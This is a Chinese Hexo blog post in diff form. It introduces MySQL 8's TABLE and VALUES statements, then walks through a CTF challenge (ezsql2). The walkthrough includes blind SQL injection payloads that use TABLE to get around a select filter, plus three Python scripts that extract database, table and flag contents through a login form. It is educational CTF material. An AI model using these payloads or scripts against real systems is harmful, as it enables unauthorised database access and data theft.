@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>table语句 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="table语句mysql8版本上线了新的特性，就是table语句和VALUES语句 table语句作用 1231. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等2. 用来替换是被当做子查询的这类小表的SELECT语句  具体语法 1table table_name [order by column_name] [LIMIT number [OFFSET number]] 从语法中的or">
+<meta property="og:type" content="article">
+<meta property="og:title" content="table语句">
+<meta property="og:url" content="http://example.com/2021/10/14/table%E8%AF%AD%E5%8F%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="table语句mysql8版本上线了新的特性，就是table语句和VALUES语句 table语句作用 1231. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等2. 用来替换是被当做子查询的这类小表的SELECT语句  具体语法 1table table_name [order by column_name] [LIMIT number [OFFSET number]] 从语法中的or">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-14T15:14:21.250Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-table语句" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/14/table%E8%AF%AD%E5%8F%A5/" class="article-date">
+  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      table语句
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h1><p>mysql8版本上线了新的特性，就是table语句和VALUES语句</p>
+<h2 id="table语句-1"><a href="#table语句-1" class="headerlink" title="table语句"></a>table语句</h2><p>作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等</span><br><span class="line"></span><br><span class="line">2. 用来替换是被当做子查询的这类小表的SELECT语句</span><br></pre></td></tr></table></figure>
+
+<p>具体语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table table_name [order by column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
+<p>从语法中的order by column_name可以看出，可以排序，也可以过滤记录集</p>
+<h3 id="简单全表扫描"><a href="#简单全表扫描" class="headerlink" title="简单全表扫描"></a>简单全表扫描</h3><p>传统语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br></pre></td></tr></table></figure>
+
+<p>table语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table t1;</span><br></pre></td></tr></table></figure>
+
+<h2 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h2><p>作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用做功能展示或快速造数据场景，结果列名字以column_0开头，以此类推</span><br></pre></td></tr></table></figure>
+
+<h3 id="单条values语句"><a href="#单条values语句" class="headerlink" title="单条values语句"></a>单条values语句</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3);</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1|        2|        3|</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">1 row inset(0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="多条values语句"><a href="#多条values语句" class="headerlink" title="多条values语句"></a>多条values语句</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8);</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="多条-VALUES-联合-UNION-ALL"><a href="#多条-VALUES-联合-UNION-ALL" class="headerlink" title="多条 VALUES 联合 UNION ALL"></a>多条 VALUES 联合 UNION ALL</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9);</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据字段下标排序，从1开始的多条values联合union-all-values"><a href="#根据字段下标排序，从1开始的多条values联合union-all-values" class="headerlink" title="根据字段下标排序，从1开始的多条values联合union all values"></a>根据字段下标排序，从1开始的多条values联合union all values</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9) order by 1 desc ;</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例-鹤城杯ezsql2"><a href="#实例-鹤城杯ezsql2" class="headerlink" title="实例(鹤城杯ezsql2)"></a>实例(鹤城杯ezsql2)</h2><p>那时我的想法是使用异或注入，但是发现重要的select被过滤掉了，然后发现mysql版本是8以上，所以可以使用table语句来绕过select过滤</p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admn&#x27;||(ascii(substr(database(),1,1))=32)#</span><br></pre></td></tr></table></figure>
+<p>爆出数据库为ctf</p>
+<p>爆数据表，我们知道数据表的信息一般存储在information_schema.tables中，所以我们可以使用table语句来读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/information_schema.tables/**/order/**/by/**/database_name/**/limit/**/1,1)#</span><br></pre></td></tr></table></figure>
+<p>由于infoemation_schema.tables被过滤掉了，所以可以使用mysql.innodb_table_stats来读取数据表的信息，其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)</span><br></pre></td></tr></table></figure>
+<p>意思是每条列的第一行进行比较，从而爆出ctf库中的数据表有哪些，爆出数据表为f11114g</p>
+<p>爆数据表中的信息，可以利用mysql8新增的特性table语句来构造盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#</span><br></pre></td></tr></table></figure>
+
+
+<p>所以我们可以写exp</p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">pt = &#x27;&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?&lt;&gt;@!#$%^&amp;*~&#x27;</span><br><span class="line">url=&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sql=&quot;user()&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def blindequ(start,end):</span><br><span class="line">    ret=&quot;&quot;</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        for ch in pt:</span><br><span class="line">            payload=&quot;admn&#x27;||(substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27;)#&quot;.format(sql,i,ch)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;:payload,</span><br><span class="line">                &quot;password&quot;:&#x27;a&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            #print data</span><br><span class="line">            #req=requests.post(url,data=data,allow_redirects=False)</span><br><span class="line">            req=requests.post(url+&quot;/login.php&quot;,data=data)</span><br><span class="line">            #print req.text</span><br><span class="line">            #if req.status_code!=200 and req.status_code!=302:</span><br><span class="line">            #    continue </span><br><span class="line">            if  &quot;password error!&quot; in req.text:</span><br><span class="line">                ret=ret+ch</span><br><span class="line">                sys.stdout.write(&quot;[-]&#123;0&#125; Result : -&gt; &#123;1&#125; &lt;-\r&quot;.format(threading.current_thread().name,ret))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                break</span><br><span class="line">    print(threading.current_thread().name+&quot;[+]Result : -&gt;&quot;+ret+&quot;&lt;-&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">blindequ(1,20)</span><br></pre></td></tr></table></figure>
+
+<p>爆数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import binascii</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">url = &quot;http://182.116.62.85:26571/login.php&quot;</span><br><span class="line">def trans(a):</span><br><span class="line">    a = binascii.b2a_hex(a.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return &#x27;0x&#x27;+str(a,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(1,500): </span><br><span class="line">    hexstr = &#x27;&#x27;</span><br><span class="line">    for char in range(32, 126):</span><br><span class="line">        hexstr = trans(flag+ chr(char))</span><br><span class="line">        #fl11aag</span><br><span class="line">        payload = &quot;admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/mysql.innodb_table_stats/**/order/**/by/**/database_name/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        #payload = &quot;admin&#x27;/**/and/**/(&#123;&#125;)=&gt;binary(TABLE/**/ctf.fl11aag/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        datas = &#123;&quot;username&quot;:payload,&quot;password&quot;:&quot;admin&quot;&#125;</span><br><span class="line">        r = req.post(url,data=datas)</span><br><span class="line">        if(&quot;login success&quot; in r.text):</span><br><span class="line">            flag = flag + chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>最后读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://139.129.98.9:30003/login.php&#x27;</span><br><span class="line">payload = &#x27;admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#&#x27;</span><br><span class="line">passa=&#x27;123&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;username&#x27;: py,&#x27;password&#x27;:passa&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;password&#x27; in re.text:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]">https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]</a></p>
+<pre><code>[https://www.crisprx.top/archives/203]
+
+[https://zhuanlan.zhihu.com/p/116632771]
+</code></pre>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          pop链4之反序列化逃逸
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">伪随机数以及文件泄露</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="table语句" data-title="table语句" data-url="http://example.com/2021/10/14/table%E8%AF%AD%E5%8F%A5/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="table语句">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
